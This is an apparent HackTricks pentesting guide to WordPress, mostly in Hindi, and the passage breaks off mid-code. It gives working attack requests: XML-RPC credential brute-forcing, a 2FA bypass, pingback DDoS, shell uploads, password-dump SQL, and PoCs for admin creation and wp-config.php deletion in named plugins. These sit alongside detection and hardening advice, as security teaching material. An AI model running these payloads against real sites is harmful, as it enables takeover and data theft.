# Wordpress

{{#include ../../banners/hacktricks-training.md}}

## बुनियादी जानकारी

- **Uploaded** फ़ाइलें जाती हैं: `http://10.10.10.10/wp-content/uploads/2018/08/a.txt`
- **Themes files can be found in /wp-content/themes/,** इसलिए अगर आप थीम की कुछ php बदलकर RCE हासिल करते हैं तो आप संभवतः उस path का उपयोग करेंगे। उदाहरण के लिए: Using **theme twentytwelve** आप **404.php** फ़ाइल में **access** कर सकते हैं: [**/wp-content/themes/twentytwelve/404.php**](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

- **Another useful url could be:** [**/wp-content/themes/default/404.php**](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

- In **wp-config.php** आप डेटाबेस का root पासवर्ड पा सकते हैं।
- जाँचने के लिए डिफ़ॉल्ट लॉगिन पथ: _**/wp-login.php, /wp-login/, /wp-admin/, /wp-admin.php, /login/**_

### **Main WordPress Files**

- `index.php`
- `license.txt` में उपयोगी जानकारी होती है जैसे कि WordPress का इंस्टॉल किया गया संस्करण।
- `wp-activate.php` का उपयोग नए WordPress साइट सेटअप के दौरान ईमेल activation प्रक्रिया के लिए होता है।
- Login फ़ोल्डर्स (छुपाने के लिए नाम बदले गए हो सकते हैं):
- `/wp-admin/login.php`
- `/wp-admin/wp-login.php`
- `/login.php`
- `/wp-login.php`
- `xmlrpc.php` एक फ़ाइल है जो WordPress की उस सुविधा का प्रतिनिधित्व करती है जो HTTP को transport mechanism के रूप में और XML को encoding mechanism के रूप में उपयोग करके डेटा को ट्रांसमिट करने में सक्षम बनाती है। इस प्रकार का संचार WordPress [REST API](https://developer.wordpress.org/rest-api/reference) द्वारा बदल दिया गया है।
- `wp-content` फ़ोल्डर मुख्य निर्देशिका है जहाँ plugins और themes संग्रहीत होते हैं।
- `wp-content/uploads/` वह निर्देशिका है जहाँ प्लेटफ़ॉर्म पर अपलोड की गई कोई भी फ़ाइलें संग्रहीत होती हैं।
- `wp-includes/` यह वह निर्देशिका है जहाँ core फ़ाइलें संग्रहीत होती हैं, जैसे certificates, fonts, JavaScript फ़ाइलें, और widgets।
- `wp-sitemap.xml` WordPress संस्करण 5.5 और उससे ऊपर में, Wordpress सभी public पोस्ट और publicly queryable post types और taxonomies के साथ एक sitemap XML फ़ाइल उत्पन्न करता है।

**Post exploitation**

- `wp-config.php` फ़ाइल में वह जानकारी होती है जिसकी आवश्यकता WordPress को database से कनेक्ट करने के लिए होती है जैसे database name, database host, username और पासवर्ड, authentication keys और salts, और database table prefix। इस configuration फ़ाइल का उपयोग DEBUG मोड को सक्रिय करने के लिए भी किया जा सकता है, जो troubleshooting में उपयोगी हो सकता है।

### Users Permissions

- **Administrator**
- **Editor**: अपना और दूसरों के पोस्ट प्रकाशित और प्रबंधित कर सकता है
- **Author**: अपने पोस्ट प्रकाशित और प्रबंधित कर सकता है
- **Contributor**: अपने पोस्ट लिख और प्रबंधित कर सकता है लेकिन उन्हें प्रकाशित नहीं कर सकता
- **Subscriber**: पोस्ट ब्राउज़ करता है और अपना प्रोफ़ाइल संपादित कर सकता है

## **Passive Enumeration**

### **WordPress संस्करण प्राप्त करें**

जाँचें कि क्या आप फ़ाइलें `/license.txt` या `/readme.html` खोज सकते हैं

पेज के **source code** के अंदर (उदाहरण from [https://wordpress.org/support/article/pages/](https://wordpress.org/support/article/pages/)):

- grep
```bash
curl https://victim.com/ | grep 'content="WordPress'
```
- `meta name`

![](<../../images/image (1111).png>)

- CSS लिंक फ़ाइलें

![](<../../images/image (533).png>)

- JavaScript फ़ाइलें

![](<../../images/image (524).png>)

### Plugins प्राप्त करें
```bash
curl -H 'Cache-Control: no-cache, no-store' -L -ik -s https://wordpress.org/support/article/pages/ | grep -E 'wp-content/plugins/' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
```
### थीम प्राप्त करें
```bash
curl -s -X GET https://wordpress.org/support/article/pages/ | grep -E 'wp-content/themes' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
```
### सामान्य रूप से संस्करण निकालें
```bash
curl -H 'Cache-Control: no-cache, no-store' -L -ik -s https://wordpress.org/support/article/pages/ | grep http | grep -E '?ver=' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2

```
## Active enumeration

### Plugins and Themes

आप संभवतः सभी Plugins और Themes ढूँढ नहीं पाएँगे। उन्हें खोजने के लिए, आपको **actively Brute Force a list of Plugins and Themes** करना होगा (खुशी की बात है कि हमारे लिए कुछ automated tools मौजूद हैं जिनमें ये lists होती हैं)।

### Users

- **ID Brute:** आप WordPress साइट से वैध users Brute Forcing users IDs के द्वारा प्राप्त कर सकते हैं:
```bash
curl -s -I -X GET http://blog.example.com/?author=1
```
यदि प्रतिक्रियाएँ **200** या **30X** हैं, तो इसका अर्थ है कि id **मान्य** है। यदि प्रतिक्रिया **400** है, तो id **अमान्य** है।

- **wp-json:** आप उपयोगकर्ताओं के बारे में जानकारी प्राप्त करने के लिए क्वेरी कर सकते हैं:
```bash
curl http://blog.example.com/wp-json/wp/v2/users
```
एक और `/wp-json/` endpoint जो उपयोगकर्ताओं के बारे में कुछ जानकारी प्रकट कर सकता है:
```bash
curl http://blog.example.com/wp-json/oembed/1.0/embed?url=POST-URL
```
Note that this endpoint only exposes users that have made a post. **केवल उन उपयोगकर्ताओं की जानकारी प्रदान की जाएगी जिनके लिए यह feature सक्षम है**।

Also note that **/wp-json/wp/v2/pages** IP addresses को leak कर सकता है।

- **Login username enumeration**: जब **`/wp-login.php`** पर लॉगिन करते समय **संदेश** अलग होता है, जो यह संकेत देता है कि **username मौजूद है या नहीं**।

### XML-RPC

यदि `xml-rpc.php` सक्रिय है तो आप credentials पर brute-force कर सकते हैं या इसका उपयोग अन्य resources पर DoS attacks लॉन्च करने के लिए कर सकते हैं। (उदाहरण के लिए आप इस process को [using this](https://github.com/relarizky/wpxploit) से automate कर सकते हैं)।

To see if it is active try to access to _**/xmlrpc.php**_ and send this request:

**जाँचें**
```html
<methodCall>
<methodName>system.listMethods</methodName>
<params></params>
</methodCall>
```
![](https://h3llwings.files.wordpress.com/2019/01/list-of-functions.png?w=656)

**Credentials Bruteforce**

**`wp.getUserBlogs`**, **`wp.getCategories`** या **`metaWeblog.getUsersBlogs`** ऐसे कुछ तरीके हैं जिन्हें brute-force credentials के लिए इस्तेमाल किया जा सकता है। यदि आप इनमें से कोई भी पा लेते हैं तो आप कुछ ऐसा भेज सकते हैं:
```html
<methodCall>
<methodName>wp.getUsersBlogs</methodName>
<params>
<param><value>admin</value></param>
<param><value>pass</value></param>
</params>
</methodCall>
```
यदि credentials अमान्य हैं तो 200 code response के अंदर संदेश _"Incorrect username or password"_ दिखाई देना चाहिए।

![](<../../images/image (107) (2) (2) (2) (2) (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (2) (4) (1).png>)

![](<../../images/image (721).png>)

सही credentials का उपयोग करके आप एक file अपलोड कर सकते हैं। response में path दिखाई देगा ([https://gist.github.com/georgestephanis/5681982](https://gist.github.com/georgestephanis/5681982))
```html
<?xml version='1.0' encoding='utf-8'?>
<methodCall>
<methodName>wp.uploadFile</methodName>
<params>
<param><value><string>1</string></value></param>
<param><value><string>username</string></value></param>
<param><value><string>password</string></value></param>
<param>
<value>
<struct>
<member>
<name>name</name>
<value><string>filename.jpg</string></value>
</member>
<member>
<name>type</name>
<value><string>mime/type</string></value>
</member>
<member>
<name>bits</name>
<value><base64><![CDATA[---base64-encoded-data---]]></base64></value>
</member>
</struct>
</value>
</param>
</params>
</methodCall>
```
Also there is a **तेज़ तरीका** to brute-force credentials using **`system.multicall`** as you can try several credentials on the same request:

<figure><img src="../../images/image (628).png" alt=""><figcaption></figcaption></figure>

**Bypass 2FA**

This method is meant for programs and not for humans, and old, therefore it doesn't support 2FA. So, if you have valid creds but the main entrance is protected by 2FA, **you might be able to abuse xmlrpc.php to login with those creds bypassing 2FA**. Note that you won't be able to perform all the actions you can do through the console, but you might still be able to get to RCE as Ippsec explains it in [https://www.youtube.com/watch?v=p8mIdm93mfw\&t=1130s](https://www.youtube.com/watch?v=p8mIdm93mfw&t=1130s)

**DDoS or port scanning**

If you can find the method _**pingback.ping**_ inside the list you can make the Wordpress send an arbitrary request to any host/port.\
This can be used to ask **हज़ारों** of Wordpress **sites** to **access** one **location** (so a **DDoS** is caused in that location) or you can use it to make **Wordpress** lo **scan** some internal **network** (you can indicate any port).
```html
<methodCall>
<methodName>pingback.ping</methodName>
<params><param>
<value><string>http://<YOUR SERVER >:<port></string></value>
</param><param><value><string>http://<SOME VALID BLOG FROM THE SITE ></string>
</value></param></params>
</methodCall>
```
![](../../images/1_JaUYIZF8ZjDGGB7ocsZC-g.png)

यदि आपको **faultCode** का मान **0** (17) से **अधिक** मिलता है, तो इसका मतलब पोर्ट खुला है।

पूर्व अनुभाग में **`system.multicall`** के उपयोग को देखें ताकि आप सीख सकें कि इस विधि का दुरुपयोग करके कैसे DDoS किया जा सकता है।

**DDoS**
```html
<methodCall>
<methodName>pingback.ping</methodName>
<params>
<param><value><string>http://target/</string></value></param>
<param><value><string>http://yoursite.com/and_some_valid_blog_post_url</string></value></param>
</params>
</methodCall>
```
![](<../../images/image (110).png>)

### wp-cron.php DoS

यह फ़ाइल आम तौर पर Wordpress साइट की root डायरेक्टरी में मौजूद होती है: **`/wp-cron.php`**\
जब इस फ़ाइल को access किया जाता है तो एक **heavy** MySQL **query** चलाई जाती है, इसलिए इसे **attackers** द्वारा **DoS** उत्पन्न करने के लिए इस्तेमाल किया जा सकता है।\
इसके अलावा, डिफ़ॉल्ट रूप से `wp-cron.php` को हर page load पर बुलाया जाता है (जब भी कोई client किसी Wordpress पेज को request करता है), जो high-traffic साइट्स पर समस्याएँ पैदा कर सकता है (DoS)।

सुझाव है कि Wp-Cron को disable कर दिया जाए और host के अंदर एक real cronjob बनाया जाए जो आवश्यक कार्यों को नियमित अंतराल पर चलाए (बिना समस्याएँ पैदा किए)।

### /wp-json/oembed/1.0/proxy - SSRF

कोशिश करें कि _https://worpress-site.com/wp-json/oembed/1.0/proxy?url=ybdk28vjsa9yirr7og2lukt10s6ju8.burpcollaborator.net_ पर पहुँचें और Worpress साइट आपके पास request कर सकती है।

This is the response when it doesn't work:

![](<../../images/image (365).png>)

## SSRF


{{#ref}}
https://github.com/t0gu/quickpress/blob/master/core/requests.go
{{#endref}}

यह tool जाँचता है कि **methodName: pingback.ping** और path **/wp-json/oembed/1.0/proxy** मौजूद हैं या नहीं और यदि मौजूद हों तो इन्हें exploit करने की कोशिश करता है।

## Automatic Tools
```bash
cmsmap -s http://www.domain.com -t 2 -a "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
wpscan --rua -e ap,at,tt,cb,dbe,u,m --url http://www.domain.com [--plugins-detection aggressive] --api-token <API_TOKEN> --passwords /usr/share/wordlists/external/SecLists/Passwords/probable-v2-top1575.txt #Brute force found users and search for vulnerabilities using a free API token (up 50 searchs)
#You can try to bruteforce the admin user using wpscan with "-U admin"
```
## एक बिट ओवरराइट करके एक्सेस प्राप्त करें

वास्तविक हमले से अधिक यह एक जिज्ञासा है। CTF [https://github.com/orangetw/My-CTF-Web-Challenges#one-bit-man](https://github.com/orangetw/My-CTF-Web-Challenges#one-bit-man) में आप किसी भी wordpress फ़ाइल का 1 बिट flip कर सकते थे। इसलिए आप फ़ाइल `/var/www/html/wp-includes/user.php` के position `5389` का बिट flip करके NOT (`!`) ऑपरेशन को NOP कर सकते थे।
```php
if ( ! wp_check_password( $password, $user->user_pass, $user->ID ) ) {
return new WP_Error(
```
## **Panel RCE**

**थीम में उपयोग किए गए php में संशोधन (admin credentials needed)**

Appearance → Theme Editor → 404 Template (at the right)

php shell के लिए सामग्री बदलें:

![](<../../images/image (384).png>)

इंटरनेट पर खोजें कि आप उस अपडेटेड पेज तक कैसे पहुँच सकते हैं। इस मामले में आपको यहाँ पहुँचना होगा: [http://10.11.1.234/wp-content/themes/twentytwelve/404.php](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

### MSF

आप उपयोग कर सकते हैं:
```bash
use exploit/unix/webapp/wp_admin_shell_upload
```
to get a session.

## Plugin RCE

### PHP plugin

It may be possible to upload .php files as a plugin.\
Create your php backdoor using for example:

![](<../../images/image (183).png>)

Then add a new plugin:

![](<../../images/image (722).png>)

Upload plugin and press Install Now:

![](<../../images/image (249).png>)

Click on Procced:

![](<../../images/image (70).png>)

Probably this won't do anything apparently, but if you go to Media, you will see your shell uploaded:

![](<../../images/image (462).png>)

Access it and you will see the URL to execute the reverse shell:

![](<../../images/image (1006).png>)

### Uploading and activating malicious plugin

यह तरीका एक ऐसे malicious plugin की installation को शामिल करता है जो ज्ञात रूप से vulnerable है और इसका exploit करके web shell प्राप्त किया जा सकता है। यह प्रक्रिया WordPress dashboard के माध्यम से इस प्रकार की जाती है:

1. **Plugin Acquisition**: plugin को किसी स्रोत से प्राप्त किया जाता है जैसे Exploit DB जैसे [**here**](https://www.exploit-db.com/exploits/36374).
2. **Plugin Installation**:
- WordPress dashboard पर जाएं, फिर `Dashboard > Plugins > Upload Plugin` पर जाएं।
- Download किया गया plugin zip file अपलोड करें।
3. **Plugin Activation**: एक बार plugin सफलतापूर्वक install हो जाने पर, इसे dashboard के माध्यम से सक्रिय करना होगा।
4. **Exploitation**:
- जब "reflex-gallery" plugin install और activate हो जाता है, तो इसे exploit किया जा सकता है क्योंकि यह ज्ञात रूप से vulnerable है।
- Metasploit framework इस vulnerability के लिए एक exploit प्रदान करता है। उपयुक्त module लोड करके और विशिष्ट commands चलाकर, meterpreter session स्थापित किया जा सकता है, जो site पर unauthorized access देता है।
- ध्यान दें कि यह WordPress साइट को exploit करने के कई तरीकों में से केवल एक है।

यह सामग्री WordPress dashboard में plugin install और activate करने के चरणों को दिखाने वाले visual aids शामिल करती है। हालांकि, इस प्रकार की vulnerabilities का exploitation उचित अनुमति के बिना illegal और unethical है। यह जानकारी जिम्मेदारी से और केवल कानूनी परिप्रेक्ष्य में उपयोग की जानी चाहिए, जैसे explicit अनुमति के साथ penetration testing।

**For more detailed steps check:** [**https://www.hackingarticles.in/wordpress-reverse-shell/**](https://www.hackingarticles.in/wordpress-reverse-shell/)

## XSS से RCE तक

- [**WPXStrike**](https://github.com/nowak0x01/WPXStrike): _**WPXStrike**_ एक script है जिसे **Cross-Site Scripting (XSS)** vulnerability को **Remote Code Execution (RCE)** या WordPress में अन्य critical vulnerabilities में escalate करने के लिए डिजाइन किया गया है। अधिक जानकारी के लिए [**this post**](https://nowak0x01.github.io/papers/76bc0832a8f682a7e0ed921627f85d1d.html) देखें। यह **Wordpress Versions 6.X.X, 5.X.X and 4.X.X** के लिए support प्रदान करता है और निम्नलिखित की अनुमति देता है:
- _**Privilege Escalation:**_ WordPress में एक user बनाता है।
- _**(RCE) Custom Plugin (backdoor) Upload:**_ अपना custom plugin (backdoor) WordPress पर upload करें।
- _**(RCE) Built-In Plugin Edit:**_ WordPress के Built-In Plugins को edit करें।
- _**(RCE) Built-In Theme Edit:**_ WordPress के Built-In Themes को edit करें।
- _**(Custom) Custom Exploits:**_ Third-Party WordPress Plugins/Themes के लिए custom exploits।

## Post Exploitation

usernames और passwords निकालें:
```bash
mysql -u <USERNAME> --password=<PASSWORD> -h localhost -e "use wordpress;select concat_ws(':', user_login, user_pass) from wp_users;"
```
admin password बदलें:
```bash
mysql -u <USERNAME> --password=<PASSWORD> -h localhost -e "use wordpress;UPDATE wp_users SET user_pass=MD5('hacked') WHERE ID = 1;"
```
## Wordpress प्लगइन्स Pentest

### हमला सतह

यह जानना कि कोई Wordpress प्लगइन अपनी कार्यक्षमता कैसे उजागर कर सकता है, उसकी कमजोरियों को खोजने के लिए महत्वपूर्ण है। आप नीचे दिए गए बिंदुओं में देख सकते हैं कि एक प्लगइन किस तरह से functionality उजागर कर सकता है और कुछ उदाहरण कमजोर प्लगइन्स के लिए [**this blog post**](https://nowotarski.info/wordpress-nonce-authorization/) देखें।

- **`wp_ajax`**

एक तरीका जिससे कोई प्लगइन उपयोगकर्ताओं के लिए फंक्शन्स को एक्सपोज़ कर सकता है वह है AJAX handlers के जरिए। इनमें logic, authorization, या authentication bugs हो सकते हैं। इसके अलावा, अक्सर ये फ़ंक्शन्स authentication और authorization दोनों को Wordpress nonce के अस्तित्व पर आधारित रखती हैं, जो **किसी भी user जिसे Wordpress instance में authenticated किया गया है** के पास हो सकता है (उसके role की परवाह किए बिना)।

ये वे functions हैं जिनका उपयोग प्लगइन में किसी function को expose करने के लिए किया जा सकता है:
```php
add_action( 'wp_ajax_action_name', array(&$this, 'function_name'));
add_action( 'wp_ajax_nopriv_action_name', array(&$this, 'function_name'));
```
**`nopriv` के उपयोग से endpoint किसी भी user के लिए accessible हो जाता है (यहाँ तक कि अप्रमाणीकृत उपयोगकर्ताओं के लिए भी)।**

> [!CAUTION]
> इसके अलावा, यदि फ़ंक्शन उपयोगकर्ता के प्राधिकरण की जाँच केवल `wp_verify_nonce` फ़ंक्शन के साथ कर रहा है, तो यह फ़ंक्शन सिर्फ यह सत्यापित करता है कि उपयोगकर्ता लॉग इन है; यह आम तौर पर उपयोगकर्ता की भूमिका की जाँच नहीं करता। इसलिए कम-विशेषाधिकार वाले उपयोगकर्ताओं को उच्च-विशेषाधिकार वाली कार्रवाइयों तक पहुँच मिल सकती है।

- **REST API**

यह भी संभव है कि wordpress से फंक्शन्स को expose किया जाए, `register_rest_route` फ़ंक्शन का उपयोग करके REST API रजिस्टर करके:
```php
register_rest_route(
$this->namespace, '/get/', array(
'methods' => WP_REST_Server::READABLE,
'callback' => array($this, 'getData'),
'permission_callback' => '__return_true'
)
);
```
The `permission_callback` एक callback फ़ंक्शन है जो जाँचता है कि दिया गया उपयोगकर्ता API method को कॉल करने के लिए अधिकृत है या नहीं।

**If the built-in `__return_true` function is used, it'll simply skip user permissions check.**

- **php फ़ाइल तक सीधे एक्सेस**

बेशक, Wordpress PHP का उपयोग करता है और plugins के अंदर की files वेब से सीधे उपलब्ध होती हैं। इसलिए, यदि किसी plugin में ऐसी कोई vulnerable functionality एक्सपोज़ हो रही है जो केवल फ़ाइल को एक्सेस करने मात्र से ट्रिगर हो जाती है, तो उसे कोई भी उपयोगकर्ता exploit कर सकता है।

### Trusted-header REST impersonation (WooCommerce Payments ≤ 5.6.1)

कुछ plugins internal integrations या reverse proxies के लिए “trusted header” शॉर्टकट लागू करते हैं और फिर उस header का उपयोग REST requests के लिए वर्तमान उपयोगकर्ता context सेट करने हेतु करते हैं। यदि वह header किसी upstream component द्वारा cryptographically request से बाउंड नहीं है, तो एक attacker उसे spoof करके privileged REST routes को administrator के रूप में हिट कर सकता है।

- प्रभाव: अनऑथेन्टिकेटेड privilege escalation to admin — core users REST route के माध्यम से नया administrator बनाकर।
- Example header: `X-Wcpay-Platform-Checkout-User: 1` (forces user ID 1, typically the first administrator account).
- Exploited route: `POST /wp-json/wp/v2/users` with an elevated role array.

PoC
```http
POST /wp-json/wp/v2/users HTTP/1.1
Host: <WP HOST>
User-Agent: Mozilla/5.0
Accept: application/json
Content-Type: application/json
X-Wcpay-Platform-Checkout-User: 1
Content-Length: 114

{"username": "honeypot", "email": "wafdemo@patch.stack", "password": "demo", "roles": ["administrator"]}
```
Why it works

- प्लगइन क्लाइंट-नियंत्रित header को authentication state से मैप करता है और capability checks को छोड़ देता है।
- WordPress core इस route के लिए `create_users` capability की उम्मीद करता है; प्लगइन का hack इसे bypass कर देता है — सीधे header से current user context सेट करके।

Expected success indicators

- HTTP 201 with a JSON body describing the created user.
- A new admin user visible in `wp-admin/users.php`.

Detection checklist

- Grep for `getallheaders()`, `$_SERVER['HTTP_...']`, or vendor SDKs that read custom headers to set user context (e.g., `wp_set_current_user()`, `wp_set_auth_cookie()`).
- Review REST registrations for privileged callbacks that lack robust `permission_callback` checks and instead rely on request headers.
- Look for usages of core user-management functions (`wp_insert_user`, `wp_create_user`) inside REST handlers that are gated only by header values.

Hardening

- Never derive authentication or authorization from client-controlled headers.
- If a reverse proxy must inject identity, terminate trust at the proxy and strip inbound copies (e.g., `unset X-Wcpay-Platform-Checkout-User` at the edge), then pass a signed token and verify it server-side.
- For REST routes performing privileged actions, require `current_user_can()` checks and a strict `permission_callback` (do NOT use `__return_true`).
- Prefer first-party auth (cookies, application passwords, OAuth) over header “impersonation”.

References: see the links at the end of this page for a public case and broader analysis.

### wp_ajax_nopriv के माध्यम से प्रामाणिकता-रहित मनमाना फ़ाइल विलोपन (Litho Theme <= 3.0)

WordPress themes and plugins frequently expose AJAX handlers through the `wp_ajax_` and `wp_ajax_nopriv_` hooks.  When the **_nopriv_** variant is used **the callback becomes reachable by unauthenticated visitors**, so any sensitive action must additionally implement:

1. A **capability check** (e.g. `current_user_can()` or at least `is_user_logged_in()`), and
2. A **CSRF nonce** validated with `check_ajax_referer()` / `wp_verify_nonce()`, and
3. **Strict input sanitisation / validation**.

The Litho multipurpose theme (< 3.1) forgot those 3 controls in the *Remove Font Family* feature and ended up shipping the following code (simplified):
```php
function litho_remove_font_family_action_data() {
if ( empty( $_POST['fontfamily'] ) ) {
return;
}
$fontfamily = str_replace( ' ', '-', $_POST['fontfamily'] );
$upload_dir = wp_upload_dir();
$srcdir  = untrailingslashit( wp_normalize_path( $upload_dir['basedir'] ) ) . '/litho-fonts/' . $fontfamily;
$filesystem = Litho_filesystem::init_filesystem();

if ( file_exists( $srcdir ) ) {
$filesystem->delete( $srcdir, FS_CHMOD_DIR );
}
die();
}
add_action( 'wp_ajax_litho_remove_font_family_action_data',        'litho_remove_font_family_action_data' );
add_action( 'wp_ajax_nopriv_litho_remove_font_family_action_data', 'litho_remove_font_family_action_data' );
```
इस स्निपेट से उत्पन्न समस्याएँ:

* **अप्रमाणित पहुँच** – `wp_ajax_nopriv_` hook रजिस्टर किया गया है।
* **No nonce / capability check** – कोई भी visitor endpoint को हिट कर सकता है।
* **No path sanitisation** – user–controlled `fontfamily` string बिना फ़िल्टर के filesystem path में concatenate किया जाता है, जिससे classic `../../` traversal संभव हो जाता है।

#### एक्सप्लॉइटेशन

एक हमलावर एक single HTTP POST request भेजकर किसी भी फाइल या डायरेक्टरी को **uploads base directory के नीचे** (आमतौर पर `<wp-root>/wp-content/uploads/`) से डिलीट कर सकता है:
```bash
curl -X POST https://victim.com/wp-admin/admin-ajax.php \
-d 'action=litho_remove_font_family_action_data' \
-d 'fontfamily=../../../../wp-config.php'
```
चूँकि `wp-config.php` *uploads* के बाहर रहता है, एक डिफ़ॉल्ट इंस्टॉलेशन पर चार `../` अनुक्रम पर्याप्त होते हैं। `wp-config.php` को हटाने पर अगली विज़िट पर WordPress को *इंस्टॉलेशन विज़ार्ड* में डाल देता है, जिससे पूरा साइट टेकओवर संभव हो जाता है (हमलावर केवल नया DB कॉन्फ़िगरेशन देता है और एक एडमिन उपयोगकर्ता बनाता है)।

अन्य प्रभावशाली लक्ष्य plugin/theme `.php` files (सिक्योरिटी प्लगइन्स को तोड़ने के लिए) या `.htaccess` rules हैं।

#### Detection checklist

* कोई भी `add_action( 'wp_ajax_nopriv_...')` callback जो filesystem helpers (`copy()`, `unlink()`, `$wp_filesystem->delete()`, आदि) को कॉल करे।
* पथों में असैनिटाइज्ड उपयोगकर्ता इनपुट का संयोजन (देखें `$_POST`, `$_GET`, `$_REQUEST`)।
* `check_ajax_referer()` और `current_user_can()`/`is_user_logged_in()` का अभाव।

#### कठोरकरण
```php
function secure_remove_font_family() {
if ( ! is_user_logged_in() ) {
wp_send_json_error( 'forbidden', 403 );
}
check_ajax_referer( 'litho_fonts_nonce' );

$fontfamily = sanitize_file_name( wp_unslash( $_POST['fontfamily'] ?? '' ) );
$srcdir = trailingslashit( wp_upload_dir()['basedir'] ) . 'litho-fonts/' . $fontfamily;

if ( ! str_starts_with( realpath( $srcdir ), realpath( wp_upload_dir()['basedir'] ) ) ) {
wp_send_json_error( 'invalid path', 400 );
}
// … proceed …
}
add_action( 'wp_ajax_litho_remove_font_family_action_data', 'secure_remove_font_family' );
//  🔒  NO wp_ajax_nopriv_ registration
```
> [!TIP]
> **Always** किसी भी disk पर write/delete ऑपरेशन को privileged समझें और निम्न की सावधानीपूर्वक जाँच करें:
> • Authentication  • Authorisation  • Nonce  • Input sanitisation  • Path containment (e.g. via `realpath()` plus `str_starts_with()`).

---

### Privilege escalation: stale role restoration और missing authorization के माध्यम से (ASE "View Admin as Role")

कई plugins "view as role" या temporary role-switching फ़ीचर implement करते हैं जिससे original role(s) को user meta में सेव किया जाता है ताकि उन्हें बाद में restore किया जा सके। यदि restoration path केवल request parameters (उदा., `$_REQUEST['reset-for']`) और plugin-maintained list पर निर्भर करता है और capabilities तथा वैध nonce की जाँच नहीं करता, तो यह एक vertical privilege escalation बन जाता है।

एक वास्तविक उदाहरण Admin and Site Enhancements (ASE) plugin (≤ 7.6.2.1) में पाया गया। reset branch ने roles को `reset-for=<username>` के आधार पर restore किया अगर username internal array `$options['viewing_admin_as_role_are']` में दिखाई देता था, लेकिन current roles को हटाने और user meta `_asenha_view_admin_as_original_roles` से saved roles को फिर से जोड़ने से पहले न तो `current_user_can()` चेक किया गया था और न ही nonce verification किया गया था:
```php
// Simplified vulnerable pattern
if ( isset( $_REQUEST['reset-for'] ) ) {
$reset_for_username = sanitize_text_field( $_REQUEST['reset-for'] );
$usernames = get_option( ASENHA_SLUG_U, [] )['viewing_admin_as_role_are'] ?? [];

if ( in_array( $reset_for_username, $usernames, true ) ) {
$u = get_user_by( 'login', $reset_for_username );
foreach ( $u->roles as $role ) { $u->remove_role( $role ); }
$orig = (array) get_user_meta( $u->ID, '_asenha_view_admin_as_original_roles', true );
foreach ( $orig as $r ) { $u->add_role( $r ); }
}
}
```
क्यों यह शोषण योग्य है

- `$_REQUEST['reset-for']` और एक plugin option को बिना server-side authorization के भरोसा किया जाता है।
- अगर किसी user के पास पहले `_asenha_view_admin_as_original_roles` में higher privileges सहेजे हुए थे और उन्हें downgraded कर दिया गया, तो वे reset path पर जाकर उन्हें पुनर्स्थापित कर सकते हैं।
- कुछ deployments में, कोई भी authenticated user `viewing_admin_as_role_are` में अभी भी मौजूद किसी अन्य username के लिए reset trigger कर सकता है (broken authorization)।

हमले की पूर्व-आवश्यकताएँ

- Vulnerable plugin version जिसमें यह feature enabled हो।
- लक्षित account के user meta में पहले के उपयोग से एक stale high-privilege role संग्रहीत होना चाहिए।
- कोई भी authenticated session; reset flow पर nonce/capability अनुपस्थित होना।

Exploitation (example)
```bash
# While logged in as the downgraded user (or any auth user able to trigger the code path),
# hit any route that executes the role-switcher logic and include the reset parameter.
# The plugin uses $_REQUEST, so GET or POST works. The exact route depends on the plugin hooks.
curl -s -k -b 'wordpress_logged_in=...' \
'https://victim.example/wp-admin/?reset-for=<your_username>'
```
कमजोर बिल्ड पर यह वर्तमान भूमिकाओं को हटा देता है और सहेजी गई मूल भूमिकाएँ (उदा., `administrator`) फिर से जोड़ देता है, जिससे प्रभावी रूप से अनुमतियाँ बढ़ जाती हैं।

Detection checklist

- ऐसी role-switching सुविधाओं की तलाश करें जो user meta में “original roles” को स्थायी रूप से संग्रहीत करती हैं (उदा., `_asenha_view_admin_as_original_roles`)।
- उन reset/restore paths की पहचान करें जो:
- उपयोगकर्ता नामों को `$_REQUEST` / `$_GET` / `$_POST` से पढ़ते हैं।
- `add_role()` / `remove_role()` के माध्यम से roles को modify करते हैं बिना `current_user_can()` और `wp_verify_nonce()` / `check_admin_referer()` के।
- plugin option array (उदा., `viewing_admin_as_role_are`) के आधार पर authorize करते हैं बजाय कार्रवाई करने वाले उपयोगकर्ता की क्षमताओं के।

Hardening

- हर स्थिति-परिवर्तन शाखा पर capability checks लागू करें (उदा., `current_user_can('manage_options')` या ज़्यादा सख्त)।
- सभी role/permission परिवर्तनों के लिए nonces अनिवार्य करें और उन्हें सत्यापित करें: `check_admin_referer()` / `wp_verify_nonce()`।
- कभी भी request-प्रदान किए गए usernames पर भरोसा न करें; लक्ष्य उपयोगकर्ता को सर्वर-साइड पर प्रमाणीकृत उपयोगकर्ता और स्पष्ट नीति के आधार पर निर्धारित करें।
- प्रोफ़ाइल/रोल अपडेट्स पर “original roles” स्थिति को अमान्य करें ताकि पुरानी उच्च-अधिकारों वाली पुनर्स्थापना से बचा जा सके:
```php
add_action( 'profile_update', function( $user_id ) {
delete_user_meta( $user_id, '_asenha_view_admin_as_original_roles' );
}, 10, 1 );
```
- अस्थायी role switches के लिए न्यूनतम state ही स्टोर करने और time-limited, capability-guarded tokens का उपयोग करने पर विचार करें।

---

### Unauthenticated privilege escalation via cookie‑trusted user switching on public init (Service Finder “sf-booking”)

कुछ plugins सार्वजनिक `init` hook पर user-switching helpers को जोड़ते हैं और पहचान client-controlled cookie से निकाली जाती है। यदि कोड authentication, capability और एक वैध `nonce` की पुष्टि किए बिना `wp_set_auth_cookie()` को कॉल करता है, तो कोई भी unauthenticated visitor किसी भी arbitrary user ID के रूप में जोड़-जबर्दस्ती लॉगिन करवा सकता है।

Typical vulnerable pattern (simplified from Service Finder Bookings ≤ 6.1):
```php
function service_finder_submit_user_form(){
if ( isset($_GET['switch_user']) && is_numeric($_GET['switch_user']) ) {
$user_id = intval( sanitize_text_field($_GET['switch_user']) );
service_finder_switch_user($user_id);
}
if ( isset($_GET['switch_back']) ) {
service_finder_switch_back();
}
}
add_action('init', 'service_finder_submit_user_form');

function service_finder_switch_back() {
